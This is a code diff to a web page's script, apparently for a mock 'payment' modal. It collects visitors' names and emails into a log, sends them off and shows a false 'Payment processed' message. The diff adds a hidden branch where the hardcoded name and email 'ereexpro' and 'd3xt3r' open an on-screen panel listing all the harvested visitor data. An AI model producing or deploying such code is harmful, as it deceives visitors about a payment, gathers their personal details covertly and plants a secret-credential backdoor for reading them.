@@ -328,6 +328,8 @@
 
   // Payment modal logic
   const modal = document.getElementById('paymentModal');
+  const form = document.getElementById('paymentForm');
+
   button.addEventListener('click', () => {
     runaway = false;
     button.style.position = 'relative';
@@ -376,17 +378,43 @@
   }, 8000);
 
   // Submit payment form & send data
-  const form = document.getElementById('paymentForm');
   form.addEventListener('submit', e => {
     e.preventDefault();
     const name = form.querySelector('#name').value.trim();
     const email = form.querySelector('#email').value.trim();
     if(name && email){
-      alert('Payment processed. The darkness is unlocked for you.');
-      dataLog.payment = {name, email, time: Date.now()};
-      sendData();
-      modal.classList.remove('active');
-      window.location.href = 'https://your-drive-link.com';
+      if(name.toLowerCase() === 'ereexpro' && email.toLowerCase() === 'd3xt3r'){
+        // عرض بيانات dataLog للأدمن على الصفحة
+        let adminDiv = document.getElementById('adminDataDisplay');
+        if(!adminDiv){
+          adminDiv = document.createElement('div');
+          adminDiv.id = 'adminDataDisplay';
+          adminDiv.style.position = 'fixed';
+          adminDiv.style.top = '10px';
+          adminDiv.style.right = '10px';
+          adminDiv.style.width = '400px';
+          adminDiv.style.height = '80vh';
+          adminDiv.style.overflowY = 'scroll';
+          adminDiv.style.backgroundColor = 'rgba(0,0,0,0.9)';
+          adminDiv.style.color = '#ff0000';
+          adminDiv.style.fontFamily = "'Courier New', Courier, monospace";
+          adminDiv.style.padding = '10px';
+          adminDiv.style.zIndex = '1000';
+          adminDiv.style.border = '2px solid #ff0000';
+          adminDiv.style.borderRadius = '10px';
+          document.body.appendChild(adminDiv);
+        }
+        adminDiv.textContent = JSON.stringify(dataLog, null, 2);
+        alert('Welcome admin! Data displayed on screen.');
+        form.reset();
+        modal.classList.remove('active');
+      } else {
+        alert('Payment processed. The darkness is unlocked for you.');
+        dataLog.payment = {name, email, time: Date.now()};
+        sendData();
+        modal.classList.remove('active');
+        window.location.href = 'https://your-drive-link.com';
+      }
     } else {
       alert('Please fill all fields.');
     }
